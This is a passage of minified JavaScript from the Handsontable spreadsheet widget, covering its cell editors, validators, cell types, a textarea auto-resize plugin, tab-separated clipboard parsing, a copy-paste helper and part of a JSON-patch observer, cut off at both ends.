i=this._closeCallback;this._closeCallback=function(e){if(i){i(e)}r(e)}}if(this.isWaiting()){return}if(this.state==e.EditorState.VIRGIN){var s=this;setTimeout(function(){s._fireCallbacks(true)});return}if(this.state==e.EditorState.EDITING){if(t){this.cancelChanges();return}var o=[[String.prototype.trim.call(this.getValue())]];this.state=e.EditorState.WAITING;this.saveValue(o,n);if(this.instance.getCellValidator(this.cellProperties)){var s=this;this.instance.addHookOnce("afterValidate",function(t){s.state=e.EditorState.FINISHED;s.discardEditor(t)})}else{this.state=e.EditorState.FINISHED;this.discardEditor(true)}}};t.prototype.cancelChanges=function(){this.state=e.EditorState.FINISHED;this.discardEditor()};t.prototype.discardEditor=function(t){if(this.state!==e.EditorState.FINISHED){return}if(t===false&&this.cellProperties.allowInvalid!==true){this.instance.selectCell(this.row,this.col);this.focus();this.state=e.EditorState.EDITING;this._fireCallbacks(false)}else{this.close();this._opened=false;this.state=e.EditorState.VIRGIN;this._fireCallbacks(true)}};t.prototype.isOpened=function(){return this._opened};t.prototype.isWaiting=function(){return this.state===e.EditorState.WAITING};e.editors.BaseEditor=t})(Handsontable);(function(e){var t=e.editors.BaseEditor.prototype.extend();t.prototype.init=function(){this.createElements();this.bindEvents()};t.prototype.getValue=function(){return this.TEXTAREA.value};t.prototype.setValue=function(e){this.TEXTAREA.value=e};var n=function(n){var r=this;var i=r.getActiveEditor();var s=e.helper.keyCode;var o=(n.ctrlKey||n.metaKey)&&!n.altKey;if(n.target!==i.TEXTAREA||n.isImmediatePropagationStopped()){return}if(n.keyCode===17||n.keyCode===224||n.keyCode===91||n.keyCode===93){n.stopImmediatePropagation();return}switch(n.keyCode){case s.ARROW_RIGHT:if(i.wtDom.getCaretPosition(i.TEXTAREA)!==i.TEXTAREA.value.length){n.stopImmediatePropagation()}break;case s.ARROW_LEFT:if(i.wtDom.getCaretPosition(i.TEXTAREA)!==0){n.stopImmediatePropagation()}break;case s.ENTER:var u=i.instance.getSelected();var a=!(u[0]===u[2]&&u[1]===u[3]);if(o&&!a||n.altKey){if(i.isOpened()){i.setValue(i.getValue()+"\n");i.focus()}else{i.beginEditing(i.originalValue+"\n")}n.stopImmediatePropagation()}n.preventDefault();break;case s.A:case s.X:case s.C:case s.V:if(o){n.stopImmediatePropagation();break};case s.BACKSPACE:case s.DELETE:case s.HOME:case s.END:n.stopImmediatePropagation();break}};t.prototype.open=function(){this.refreshDimensions();this.instance.addHook("beforeKeyDown",n)};t.prototype.close=function(){this.textareaParentStyle.display="none";if(document.activeElement===this.TEXTAREA){this.instance.listen()}this.instance.removeHook("beforeKeyDown",n)};t.prototype.focus=function(){this.TEXTAREA.focus();this.wtDom.setCaretPosition(this.TEXTAREA,this.TEXTAREA.value.length)};t.prototype.createElements=function(){this.$body=$(document.body);this.wtDom=new WalkontableDom;this.TEXTAREA=document.createElement("TEXTAREA");this.$textarea=$(this.TEXTAREA);this.wtDom.addClass(this.TEXTAREA,"handsontableInput");this.textareaStyle=this.TEXTAREA.style;this.textareaStyle.width=0;this.textareaStyle.height=0;this.TEXTAREA_PARENT=document.createElement("DIV");this.wtDom.addClass(this.TEXTAREA_PARENT,"handsontableInputHolder");this.textareaParentStyle=this.TEXTAREA_PARENT.style;this.textareaParentStyle.top=0;this.textareaParentStyle.left=0;this.textareaParentStyle.display="none";this.TEXTAREA_PARENT.appendChild(this.TEXTAREA);this.instance.rootElement[0].appendChild(this.TEXTAREA_PARENT);var t=this;e.PluginHooks.add("afterRender",function(){t.instance.registerTimeout("refresh_editor_dimensions",function(){t.refreshDimensions()},0)})};t.prototype.refreshDimensions=function(){if(this.state!==e.EditorState.EDITING){return}this.TD=this.instance.getCell(this.row,this.col);if(!this.TD){return}var t=$(this.TD);var n=this.wtDom.offset(this.TD);var r=this.wtDom.offset(this.instance.rootElement[0]);var i=this.instance.rootElement.scrollTop();var s=this.instance.rootElement.scrollLeft();var o=n.top-r.top+i-1;var u=n.left-r.left+s-1;var a=this.instance.getSettings();var f=a.rowHeaders===false?0:1;var l=a.colHeaders===false?0:1;if(o<0){o=0}if(u<0){u=0}if(f>0&&parseInt(t.css("border-top-width"),10)>0){o+=1}if(l>0&&parseInt(t.css("border-left-width"),10)>0){u+=1}this.textareaParentStyle.top=o+"px";this.textareaParentStyle.left=u+"px";var c=t.width(),h=this.instance.view.maximumVisibleElementWidth(u)-10,p=t.outerHeight()-4,d=this.instance.view.maximumVisibleElementHeight(o)-5;if(parseInt(t.css("border-top-width"),10)>0){p-=1}if(parseInt(t.css("border-left-width"),10)>0){if(f>0){c-=1}}this.$textarea.autoResize({minHeight:Math.min(p,d),maxHeight:d,minWidth:Math.min(c,h),maxWidth:h,animate:false,extraSpace:0});this.textareaParentStyle.display="block"};t.prototype.bindEvents=function(){this.$textarea.on("cut.editor",function(e){e.stopPropagation()});this.$textarea.on("paste.editor",function(e){e.stopPropagation()})};e.editors.TextEditor=t;e.editors.registerEditor("text",e.editors.TextEditor)})(Handsontable);(function(e){var t=e.editors.BaseEditor.prototype.extend();t.prototype.beginEditing=function(){var e=this.TD.querySelector('input[type="checkbox"]');if(e){$(e).trigger("click")}};t.prototype.finishEditing=function(){};t.prototype.init=function(){};t.prototype.open=function(){};t.prototype.close=function(){};t.prototype.getValue=function(){};t.prototype.setValue=function(){};t.prototype.focus=function(){};e.editors.CheckboxEditor=t;e.editors.registerEditor("checkbox",t)})(Handsontable);(function(e){var t=e.editors.TextEditor.prototype.extend();t.prototype.init=function(){if(!$.datepicker){throw new Error("jQuery UI Datepicker dependency not found. Did you forget to include jquery-ui.custom.js or its substitute?")}e.editors.TextEditor.prototype.init.apply(this,arguments);this.isCellEdited=false;var t=this;this.instance.addHook("afterDestroy",function(){t.destroyElements()})};t.prototype.createElements=function(){e.editors.TextEditor.prototype.createElements.apply(this,arguments);this.datePicker=document.createElement("DIV");this.instance.view.wt.wtDom.addClass(this.datePicker,"htDatepickerHolder");this.datePickerStyle=this.datePicker.style;this.datePickerStyle.position="absolute";this.datePickerStyle.top=0;this.datePickerStyle.left=0;this.datePickerStyle.zIndex=99;document.body.appendChild(this.datePicker);this.$datePicker=$(this.datePicker);var t=this;var n={dateFormat:"yy-mm-dd",showButtonPanel:true,changeMonth:true,changeYear:true,onSelect:function(e){t.setValue(e);t.finishEditing(false)}};this.$datePicker.datepicker(n);this.$datePicker.on("mousedown",function(e){e.stopPropagation()});this.hideDatepicker()};t.prototype.destroyElements=function(){this.$datePicker.datepicker("destroy");this.$datePicker.remove()};t.prototype.open=function(){e.editors.TextEditor.prototype.open.call(this);this.showDatepicker()};t.prototype.finishEditing=function(t,n){this.hideDatepicker();e.editors.TextEditor.prototype.finishEditing.apply(this,arguments)};t.prototype.showDatepicker=function(){var e=$(this.TD);var t=e.offset();this.datePickerStyle.top=t.top+e.height()+"px";this.datePickerStyle.left=t.left+"px";var n={defaultDate:this.originalValue||void 0};$.extend(n,this.cellProperties);this.$datePicker.datepicker("option",n);if(this.originalValue){this.$datePicker.datepicker("setDate",this.originalValue)}this.datePickerStyle.display="block"};t.prototype.hideDatepicker=function(){this.datePickerStyle.display="none"};e.editors.DateEditor=t;e.editors.registerEditor("date",t)})(Handsontable);(function(e){"use strict";var t=e.editors.TextEditor.prototype.extend();t.prototype.createElements=function(){e.editors.TextEditor.prototype.createElements.apply(this,arguments);var t=document.createElement("DIV");t.className="handsontableEditor";this.TEXTAREA_PARENT.appendChild(t);this.$htContainer=$(t);this.$htContainer.handsontable()};t.prototype.prepare=function(t,n,r,i,s,o){e.editors.TextEditor.prototype.prepare.apply(this,arguments);var u=this;var a={startRows:0,startCols:0,minRows:0,minCols:0,className:"listbox",copyPaste:false,cells:function(){return{readOnly:true}},fillHandle:false,afterOnCellMouseDown:function(){var e=this.getValue();if(e!==void 0){u.setValue(e)}u.instance.destroyEditor()},beforeOnKeyDown:function(t){var n=this;switch(t.keyCode){case e.helper.keyCode.ESCAPE:u.instance.destroyEditor(true);t.stopImmediatePropagation();t.preventDefault();break;case e.helper.keyCode.ENTER:var r=n.getSelected();var i=this.getDataAtCell(r[0],r[1]);if(i!==void 0){u.setValue(i)}u.instance.destroyEditor();break;case e.helper.keyCode.ARROW_UP:if(n.getSelected()&&n.getSelected()[0]==0&&!u.cellProperties.strict){n.deselectCell();u.instance.listen();u.focus();t.preventDefault();t.stopImmediatePropagation()}break}}};if(this.cellProperties.handsontable){a=$.extend(a,o.handsontable)}this.$htContainer.handsontable("destroy");this.$htContainer.handsontable(a)};var n=function(t){if(t.isImmediatePropagationStopped()){return}var n=this.getActiveEditor();var r=n.$htContainer.handsontable("getInstance");if(t.keyCode==e.helper.keyCode.ARROW_DOWN){if(!r.getSelected()){r.selectCell(0,0)}else{var i=r.getSelected()[0];var s=i<r.countRows()-1?i+1:i;r.selectCell(s,0)}t.preventDefault();t.stopImmediatePropagation()}};t.prototype.open=function(){this.instance.addHook("beforeKeyDown",n);e.editors.TextEditor.prototype.open.apply(this,arguments);this.$htContainer.handsontable("render");if(this.cellProperties.strict){this.$htContainer.handsontable("selectCell",0,0);this.$textarea[0].style.visibility="hidden"}else{this.$htContainer.handsontable("deselectCell");this.$textarea[0].style.visibility="visible"}this.wtDom.setCaretPosition(this.$textarea[0],0,this.$textarea[0].value.length)};t.prototype.close=function(){this.instance.removeHook("beforeKeyDown",n);this.instance.listen();e.editors.TextEditor.prototype.close.apply(this,arguments)};t.prototype.focus=function(){this.instance.listen();e.editors.TextEditor.prototype.focus.apply(this,arguments)};t.prototype.beginEditing=function(t){var n=this.instance.getSettings().onBeginEditing;if(n&&n()===false){return}e.editors.TextEditor.prototype.beginEditing.apply(this,arguments)};t.prototype.finishEditing=function(t,n){if(this.$htContainer.handsontable("isListening")){this.instance.listen()}if(this.$htContainer.handsontable("getSelected")){var r=this.$htContainer.handsontable("getInstance").getValue();if(r!==void 0){this.setValue(r)}}return e.editors.TextEditor.prototype.finishEditing.apply(this,arguments)};e.editors.HandsontableEditor=t;e.editors.registerEditor("handsontable",t)})(Handsontable);(function(e){var t=e.editors.HandsontableEditor.prototype.extend();t.prototype.init=function(){e.editors.HandsontableEditor.prototype.init.apply(this,arguments);this.query=null;this.choices=[]};t.prototype.createElements=function(){e.editors.HandsontableEditor.prototype.createElements.apply(this,arguments);this.$htContainer.addClass("autocompleteEditor")};t.prototype.bindEvents=function(){var t=this;this.$textarea.on("keydown.autocompleteEditor",function(n){if(!e.helper.isMetaKey(n.keyCode)||[e.helper.keyCode.BACKSPACE,e.helper.keyCode.DELETE].indexOf(n.keyCode)!=-1){setTimeout(function(){t.queryChoices(t.$textarea.val())})}else if(n.keyCode==e.helper.keyCode.ENTER&&t.cellProperties.strict!==true){t.$htContainer.handsontable("deselectCell")}});this.$htContainer.on("mouseleave",function(){if(t.cellProperties.strict===true){t.highlightBestMatchingChoice()}});this.$htContainer.on("mouseenter",function(){t.$htContainer.handsontable("deselectCell")});e.editors.HandsontableEditor.prototype.bindEvents.apply(this,arguments)};var n;t.prototype.open=function(){e.editors.HandsontableEditor.prototype.open.apply(this,arguments);this.$textarea[0].style.visibility="visible";this.focus();var t=this.$htContainer.handsontable("getInstance");var r=this;t.updateSettings({colWidths:[this.wtDom.outerWidth(this.TEXTAREA)-2],afterRenderer:function(e,t,n,i,s){var o=this.getCellMeta(t,n).filteringCaseSensitive===true;var u=o?s.indexOf(this.query):s.toLowerCase().indexOf(r.query.toLowerCase());if(u!=-1){var a=s.substr(u,r.query.length);e.innerHTML=s.replace(a,"<strong>"+a+"</strong>")}}});n=function(t){var n=this;if(t.keyCode==e.helper.keyCode.ARROW_UP){if(n.getSelected()&&n.getSelected()[0]==0){if(!parent.cellProperties.strict){n.deselectCell()}parent.instance.listen();parent.focus();t.preventDefault();t.stopImmediatePropagation()}}};t.addHook("beforeKeyDown",n);this.queryChoices(this.TEXTAREA.value)};t.prototype.close=function(){this.$htContainer.handsontable("getInstance").removeHook("beforeKeyDown",n);e.editors.HandsontableEditor.prototype.close.apply(this,arguments)};t.prototype.queryChoices=function(t){this.query=t;if(typeof this.cellProperties.source=="function"){var n=this;this.cellProperties.source(t,function(e){n.updateChoicesList(e)})}else if(e.helper.isArray(this.cellProperties.source)){var r;if(!t||this.cellProperties.filter===false){r=this.cellProperties.source}else{var i=this.cellProperties.filteringCaseSensitive===true;var s=t.toLowerCase();r=this.cellProperties.source.filter(function(e){if(i){return e.indexOf(t)!=-1}else{return e.toLowerCase().indexOf(s)!=-1}})}this.updateChoicesList(r)}else{this.updateChoicesList([])}};t.prototype.updateChoicesList=function(t){this.choices=t;this.$htContainer.handsontable("loadData",e.helper.pivot([t]));if(this.cellProperties.strict===true){this.highlightBestMatchingChoice()}this.focus()};t.prototype.highlightBestMatchingChoice=function(){var e=this.findBestMatchingChoice();if(typeof e=="undefined"&&this.cellProperties.allowInvalid===false){e=0}if(typeof e=="undefined"){this.$htContainer.handsontable("deselectCell")}else{this.$htContainer.handsontable("selectCell",e,0)}};t.prototype.findBestMatchingChoice=function(){var e={};var t=this.getValue().length;var n;var r;var i;for(var s=0,o=this.choices.length;s<o;s++){n=this.choices[s];if(t>0){r=n.indexOf(this.getValue())}else{r=n===this.getValue()?0:-1}if(r==-1)continue;i=n.length-r-t;if(typeof e.indexOfValue=="undefined"||e.indexOfValue>r||e.indexOfValue==r&&e.charsLeft>i){e.indexOfValue=r;e.charsLeft=i;e.index=s}}return e.index};e.editors.AutocompleteEditor=t;e.editors.registerEditor("autocomplete",t)})(Handsontable);(function(e){var t=e.editors.TextEditor.prototype.extend();var n=new WalkontableDom;t.prototype.createElements=function(){e.editors.TextEditor.prototype.createElements.apply(this,arguments);this.TEXTAREA=document.createElement("input");this.TEXTAREA.setAttribute("type","password");this.TEXTAREA.className="handsontableInput";this.textareaStyle=this.TEXTAREA.style;this.textareaStyle.width=0;this.textareaStyle.height=0;this.$textarea=$(this.TEXTAREA);n.empty(this.TEXTAREA_PARENT);this.TEXTAREA_PARENT.appendChild(this.TEXTAREA)};e.editors.PasswordEditor=t;e.editors.registerEditor("password",t)})(Handsontable);(function(e){var t=e.editors.BaseEditor.prototype.extend();t.prototype.init=function(){this.select=document.createElement("SELECT");e.Dom.addClass(this.select,"htSelectEditor");this.select.style.display="none";this.instance.rootElement[0].appendChild(this.select)};t.prototype.prepare=function(){e.editors.BaseEditor.prototype.prepare.apply(this,arguments);var t=this.cellProperties.selectOptions;var n;if(typeof t=="function"){n=this.prepareOptions(t(this.row,this.col,this.prop))}else{n=this.prepareOptions(t)}e.Dom.empty(this.select);for(var r in n){if(n.hasOwnProperty(r)){var i=document.createElement("OPTION");i.value=r;e.Dom.fastInnerHTML(i,n[r]);this.select.appendChild(i)}}};t.prototype.prepareOptions=function(t){var n={};if(e.helper.isArray(t)){for(var r=0,i=t.length;r<i;r++){n[t[r]]=t[r]}}else if(typeof t=="object"){n=t}return n};t.prototype.getValue=function(){return this.select.value};t.prototype.setValue=function(e){this.select.value=e};var n=function(t){var n=this;var r=n.getActiveEditor();switch(t.keyCode){case e.helper.keyCode.ARROW_UP:var i=r.select.find("option:selected").prev();if(i.length==1){i.prop("selected",true)}t.stopImmediatePropagation();t.preventDefault();break;case e.helper.keyCode.ARROW_DOWN:var s=r.select.find("option:selected").next();if(s.length==1){s.prop("selected",true)}t.stopImmediatePropagation();t.preventDefault();break}};t.prototype.open=function(){var t=e.Dom.outerWidth(this.TD);var r=e.Dom.outerHeight(this.TD);var i=e.Dom.offset(this.instance.rootElement[0]);var s=e.Dom.offset(this.TD);this.select.style.height=r+"px";this.select.style.minWidth=t+"px";this.select.style.top=s.top-i.top+"px";this.select.style.left=s.left-i.left-2+"px";this.select.style.display="";this.instance.addHook("beforeKeyDown",n)};t.prototype.close=function(){this.select.style.display="none";this.instance.removeHook("beforeKeyDown",n)};t.prototype.focus=function(){this.select.focus()};e.editors.SelectEditor=t;e.editors.registerEditor("select",t)})(Handsontable);(function(e){var t=e.editors.AutocompleteEditor.prototype.extend();t.prototype.prepare=function(){e.editors.AutocompleteEditor.prototype.prepare.apply(this,arguments);this.cellProperties.filter=false;this.cellProperties.strict=true};e.editors.DropdownEditor=t;e.editors.registerEditor("dropdown",t)})(Handsontable);Handsontable.NumericValidator=function(e,t){if(e===null){e=""}t(/^-?\d*\.?\d*$/.test(e))};var process=function(e,t){var n=e;var r=typeof n==="string"?n.toLowerCase():null;return function(e){var i=false;for(var s=0,o=e.length;s<o;s++){if(n===e[s]){i=true;break}else if(r===e[s].toLowerCase()){i=true;break}}t(i)}};Handsontable.AutocompleteValidator=function(e,t){if(this.strict&&this.source){typeof this.source==="function"?this.source(e,process(e,t)):process(e,t)(this.source)}else{t(true)}};Handsontable.AutocompleteCell={editor:Handsontable.editors.AutocompleteEditor,renderer:Handsontable.renderers.AutocompleteRenderer,validator:Handsontable.AutocompleteValidator};Handsontable.CheckboxCell={editor:Handsontable.editors.CheckboxEditor,renderer:Handsontable.renderers.CheckboxRenderer};Handsontable.TextCell={editor:Handsontable.editors.TextEditor,renderer:Handsontable.renderers.TextRenderer};Handsontable.NumericCell={editor:Handsontable.editors.TextEditor,renderer:Handsontable.renderers.NumericRenderer,validator:Handsontable.NumericValidator,dataType:"number"};Handsontable.DateCell={editor:Handsontable.editors.DateEditor,renderer:Handsontable.renderers.AutocompleteRenderer};Handsontable.HandsontableCell={editor:Handsontable.editors.HandsontableEditor,renderer:Handsontable.renderers.AutocompleteRenderer};Handsontable.PasswordCell={editor:Handsontable.editors.PasswordEditor,renderer:Handsontable.renderers.PasswordRenderer,copyable:false};Handsontable.DropdownCell={editor:Handsontable.editors.DropdownEditor,renderer:Handsontable.renderers.AutocompleteRenderer,validator:Handsontable.AutocompleteValidator};Handsontable.cellTypes={text:Handsontable.TextCell,date:Handsontable.DateCell,numeric:Handsontable.NumericCell,checkbox:Handsontable.CheckboxCell,autocomplete:Handsontable.AutocompleteCell,handsontable:Handsontable.HandsontableCell,password:Handsontable.PasswordCell,dropdown:Handsontable.DropdownCell};Handsontable.cellLookup={validator:{numeric:Handsontable.NumericValidator,autocomplete:Handsontable.AutocompleteValidator}};(function(e){function t(r){this.filter(t.resizableFilterSelector).each(function(){new n(e(this),r)});return this}function n(n,r){if(this.clones)return;this.config=e.extend({},t.defaults,r);this.el=n;this.nodeName=n[0].nodeName.toLowerCase();this.previousScrollTop=null;if(r.maxWidth==="original")r.maxWidth=n.width();if(r.minWidth==="original")r.minWidth=n.width();if(r.maxHeight==="original")r.maxHeight=n.height();if(r.minHeight==="original")r.minHeight=n.height();if(this.nodeName==="textarea"){n.css({resize:"none",overflowY:"none"})}n.data("AutoResizer",this);this.createClone();this.injectClone();this.bind()}t.defaults={onResize:function(){},animate:{duration:200,complete:function(){}},extraSpace:50,minHeight:"original",maxHeight:500,minWidth:"original",maxWidth:500};t.cloneCSSProperties=["lineHeight","textDecoration","letterSpacing","fontSize","fontFamily","fontStyle","fontWeight","textTransform","textAlign","direction","wordSpacing","fontSizeAdjust","padding"];t.cloneCSSValues={position:"absolute",top:-9999,left:-9999,opacity:0,overflow:"hidden",overflowX:"hidden",overflowY:"hidden",border:"1px solid black",padding:"0.49em"};t.resizableFilterSelector="textarea,input:not(input[type]),input[type=text],input[type=password]";t.AutoResizer=n;e.fn.autoResize=t;n.prototype={bind:function(){var t=e.proxy(function(){this.check();return true},this);this.unbind();this.el.bind("keyup.autoResize",t).bind("change.autoResize",t);this.check(null,true)},unbind:function(){this.el.unbind(".autoResize")},createClone:function(){var n=this.el,r=this,i=this.config;this.clones=e();if(i.minHeight!=="original"||i.maxHeight!=="original"){this.hClone=n.clone().height("auto");this.clones=this.clones.add(this.hClone)}if(i.minWidth!=="original"||i.maxWidth!=="original"){this.wClone=e("<div/>").width("auto").css({whiteSpace:"nowrap","float":"left"});this.clones=this.clones.add(this.wClone)}e.each(t.cloneCSSProperties,function(e,t){r.clones.css(t,n.css(t))});this.clones.removeAttr("name").removeAttr("id").attr("tabIndex",-1).css(t.cloneCSSValues).css("overflowY","scroll")},check:function(e,t){var n=this.config,r=this.wClone,i=this.hClone,s=this.el,o=s.val();if(r){r.text(o);var u=r.outerWidth(),a=u+n.extraSpace>=n.minWidth?u+n.extraSpace:n.minWidth,f=s.width();a=Math.min(a,n.maxWidth);if(a<f&&a>=n.minWidth||a>=n.minWidth&&a<=n.maxWidth){n.onResize.call(s);s.scrollLeft(0);n.animate&&!t?s.stop(1,1).animate({width:a},n.animate):s.width(a)}}if(i){if(a){i.width(a)}i.height(0).val(o).scrollTop(1e4);var l=i[0].scrollTop+n.extraSpace;if(this.previousScrollTop===l){return}this.previousScrollTop=l;if(l>=n.maxHeight){l=n.maxHeight}if(l<n.minHeight){l=n.minHeight}if(l==n.maxHeight&&a==n.maxWidth){s.css("overflowY","scroll")}else{s.css("overflowY","hidden")}n.onResize.call(s);n.animate&&!t?s.stop(1,1).animate({height:l},n.animate):s.height(l)}},destroy:function(){this.unbind();this.el.removeData("AutoResizer");this.clones.remove();delete this.el;delete this.hClone;delete this.wClone;delete this.clones},injectClone:function(){(t.cloneContainer||(t.cloneContainer=e("<arclones/>").appendTo("body"))).empty().append(this.clones)}}})(jQuery);(function(e){"use strict";function t(e){return e.split('"').length-1}e.SheetClip={parse:function(e){var n,r,i,s=[],o=0,u,a,f,l;i=e.split("\n");if(i.length>1&&i[i.length-1]===""){i.pop()}for(n=0,r=i.length;n<r;n+=1){i[n]=i[n].split("	");for(u=0,a=i[n].length;u<a;u+=1){if(!s[o]){s[o]=[]}if(f&&u===0){l=s[o].length-1;s[o][l]=s[o][l]+"\n"+i[n][0];if(f&&t(i[n][0])&1){f=false;s[o][l]=s[o][l].substring(0,s[o][l].length-1).replace(/""/g,'"')}}else{if(u===a-1&&i[n][u].indexOf('"')===0){s[o].push(i[n][u].substring(1).replace(/""/g,'"'));f=true}else{s[o].push(i[n][u].replace(/""/g,'"'));f=false}}}if(!f){o+=1}}return s},stringify:function(e){var t,n,r,i,s="",o;for(t=0,n=e.length;t<n;t+=1){for(r=0,i=e[t].length;r<i;r+=1){if(r>0){s+="	"}o=e[t][r];if(typeof o==="string"){if(o.indexOf("\n")>-1){s+='"'+o.replace(/"/g,'""')+'"'}else{s+=o}}else if(o===null||o===void 0){s+=""}else{s+=o}}s+="\n"}return s}}})(window);var CopyPaste=function(){var e;return{getInstance:function(){if(!e){e=new CopyPasteClass}else if(e.hasBeenDestroyed()){e.init()}e.refCounter++;return e}}}();CopyPasteClass.prototype.init=function(){var e=this,t,n;this.copyCallbacks=[];this.cutCallbacks=[];this.pasteCallbacks=[];this.listenerElement=document.documentElement;n=document.body;if(document.getElementById("CopyPasteDiv")){this.elDiv=document.getElementById("CopyPasteDiv");this.elTextarea=this.elDiv.firstChild}else{this.elDiv=document.createElement("DIV");this.elDiv.id="CopyPasteDiv";t=this.elDiv.style;t.position="fixed";t.top="-10000px";t.left="-10000px";n.appendChild(this.elDiv);this.elTextarea=document.createElement("TEXTAREA");this.elTextarea.className="copyPaste";t=this.elTextarea.style;t.width="10000px";t.height="10000px";t.overflow="hidden";this.elDiv.appendChild(this.elTextarea);if(typeof t.opacity!=="undefined"){t.opacity=0}else{}}this.keydownListener=function(t){var n=false;if(t.metaKey){n=true}else if(t.ctrlKey&&navigator.userAgent.indexOf("Mac")===-1){n=true}if(n){if(document.activeElement!==e.elTextarea&&(e.getSelectionText()!=""||["INPUT","SELECT","TEXTAREA"].indexOf(document.activeElement.nodeName)!=-1)){return}e.selectNodeText(e.elTextarea);setTimeout(function(){e.selectNodeText(e.elTextarea)},0)}if(n&&(t.keyCode===67||t.keyCode===86||t.keyCode===88)){if(t.keyCode===88){setTimeout(function(){e.triggerCut(t)},0)}else if(t.keyCode===86){setTimeout(function(){e.triggerPaste(t)},0)}}};this._bindEvent(this.listenerElement,"keydown",this.keydownListener)};CopyPasteClass.prototype.selectNodeText=function(e){e.select()};CopyPasteClass.prototype.getSelectionText=function(){var e="";if(window.getSelection){e=window.getSelection().toString()}else if(document.selection&&document.selection.type!="Control"){e=document.selection.createRange().text}return e};CopyPasteClass.prototype.copyable=function(e){if(typeof e!=="string"&&e.toString===void 0){throw new Error("copyable requires string parameter")}this.elTextarea.value=e};CopyPasteClass.prototype.onCut=function(e){this.cutCallbacks.push(e)};CopyPasteClass.prototype.onPaste=function(e){this.pasteCallbacks.push(e)};CopyPasteClass.prototype.removeCallback=function(e){var t,n;for(t=0,n=this.copyCallbacks.length;t<n;t++){if(this.copyCallbacks[t]===e){this.copyCallbacks.splice(t,1);return true}}for(t=0,n=this.cutCallbacks.length;t<n;t++){if(this.cutCallbacks[t]===e){this.cutCallbacks.splice(t,1);return true}}for(t=0,n=this.pasteCallbacks.length;t<n;t++){if(this.pasteCallbacks[t]===e){this.pasteCallbacks.splice(t,1);return true}}return false};CopyPasteClass.prototype.triggerCut=function(e){var t=this;if(t.cutCallbacks){setTimeout(function(){for(var n=0,r=t.cutCallbacks.length;n<r;n++){t.cutCallbacks[n](e)}},50)}};CopyPasteClass.prototype.triggerPaste=function(e,t){var n=this;if(n.pasteCallbacks){setTimeout(function(){var r=(t||n.elTextarea.value).replace(/\n$/,"");for(var i=0,s=n.pasteCallbacks.length;i<s;i++){n.pasteCallbacks[i](r,e)}},50)}};CopyPasteClass.prototype.destroy=function(){if(!this.hasBeenDestroyed()&&--this.refCounter==0){if(this.elDiv&&this.elDiv.parentNode){this.elDiv.parentNode.removeChild(this.elDiv)}this._unbindEvent(this.listenerElement,"keydown",this.keydownListener)}};CopyPasteClass.prototype.hasBeenDestroyed=function(){return!this.refCounter};CopyPasteClass.prototype._bindEvent=function(){if(window.jQuery){return function(e,t,n){$(e).on(t+".copypaste",n)}}else{return function(e,t,n){e.addEventListener(t,n,false)}}}();CopyPasteClass.prototype._unbindEvent=function(){if(window.jQuery){return function(e,t,n){$(e).off(t+".copypaste",n)}}else{return function(e,t,n){e.removeEventListener(t,n,false)}}}();var jsonpatch;(function(e){function i(e){if(e.indexOf("/")===-1&&e.indexOf("~")===-1)return e;return e.replace(/~/g,"~0").replace(/\//g,"~1")}function s(e,t){var n;for(var r in e){if(e.hasOwnProperty(r)){if(e[r]===t){return i(r)+"/"}else if(typeof e[r]==="object"){n=s(e[r],t);if(n!=""){return i(r)+"/"+n}}}}return""}function o(e,t){if(e===t){return"/"}var n=s(e,t);if(n===""){throw new Error("Object not found in root")}return"/"+n}function l(e){for(var t=0,n=u.length;t<n;t++){if(u[t].obj===e){return u[t]}}}function c(e,t){for(var n=0,r=e.observers.length;n<r;n++){if(e.observers[n].callback===t){return e.observers[n].observer}}}function h(e,t){for(var n=0,r=e.observers.length;n<r;n++){if(e.observers[n].observer===t){e.observers.splice(n,1);return}}}function p(e,t){g(t);if(Object.observe){m(t,e)}else{clearTimeout(t.next)}var n=l(e);h(n,t)}function d(e,t){var n=[];var i=e;var s;var h=l(e);if(!h){h=new a(e);u.push(h)}else{s=c(h,t)}if(s){return s}if(Object.observe){s=function(u){m(s,e);v(s,e);var a=0,f=u.length;while(a<f){if(!(u[a].name==="length"&&w(u[a].object))&&!(u[a].name==="__Jasmine_been_here_before__")){var l=u[a].type;switch(l){case"new":l="add";break;case"deleted":l="delete";break;case"updated":l="update";break}r[l].call(u[a],n,o(i,u[a].object))}a++}if(n){if(t){t(n)}}s.patches=n;n=[]}}else{s={};h.value=JSON.parse(JSON.stringify(e));if(t){s.callback=t;s.next=null;var p=this.intervals||[100,1e3,1e4,6e4];var d=0;var y=function(){g(s)};var b=function(){clearTimeout(s.next);s.next=setTimeout(function(){y();d=0;s.next=setTimeout(E,p[d++])},0)};var E=function(){y();if(d==p.length)d=p.length-1;s.next=setTimeout(E,p[d++])};if(typeof window!=="undefined"){if(window.addEventListener){window.addEventListener("mousedown",b);window.addEventListener("mouseup",b);window.addEventListener("keydown",b)}else{window.attachEvent("onmousedown",b);window.attachEvent("onmouseup",b);window.attachEvent("onkeydown",b)}}s.next=setTimeout(E,p[d++])}}s.patches=n;s.object=e;h.observers.push(new f(t,s));return v(s,e)}function v(e,t){if(Object.observe){Object.observe(t,e);for(var n in t){if(t.hasOwnProperty(n)){var r=t[n];if(r&&typeof r==="object"){v(e,r)}}}}return e}function m(e,t){if(Object.observe){Object.unobserve(t,e);for(var n in t){if(t.hasOwnProperty(n)){var r=t[n];if(r&&typeof r==="object"){m(e,r)}}}}return e}function g(e){if(Object.observe){Object.deliverChangeRecords(e)}else{var t;for(var n=0,r=u.length;n<r;n++){if(u[n].obj===e.object){t=u[n];break}}b(t.value,e.object,e.patches,"")}var i=e.patches;if(i.length>0){e.patches=[];if(e.callback){e.callback(i)}}return i}function b(e,t,n,r){try{var s=y(t);var o=y(e);var u=false;var a=false;for(var f=o.length-1;f>=0;f--){var l=o[f];var c=e[l];if(t.hasOwnProperty(l)){var h=t[l];if(c instanceof Object){b(c,h,n,r+"/"+i(l))}else{if(c!=h){u=true;n.push({op:"replace",path:r+"/"+i(l),value:h});e[l]=h}}}else{n.push({op:"remove",path:r+"/"+i(l)});delete e[l];a=true}}if(!a&&s.length==o.length){return}for(var f=0;f<s.length;f++){var l=s[f];if(!e.hasOwnProperty(l)){n.push({op:"add",path:r+"/"+i(l),value:t[l]});e[l]=JSON.parse(JSON.stringify(t[l]))}}}catch(p){return}}function E(e,r){var i=false,s=0,o=r.length,u;while(s<o){u=r[s];var a=u.path.split("/");var f=e;var l=1;var c=a.length;while(true){if(w(f)){var h=parseInt(a[l],10);l++;if(l>=c){i=n[u.op].call(u,f,h,e);break}f=f[h]}else{var p=a[l];if(p.indexOf("~")!=-1)p=p.replace(/~1/g,"/").replace(/~0/g,"~");l++;if(l>=c){i=t[u.op].call(u,f,p,e);break}f=f[p]}}s++}return i}var 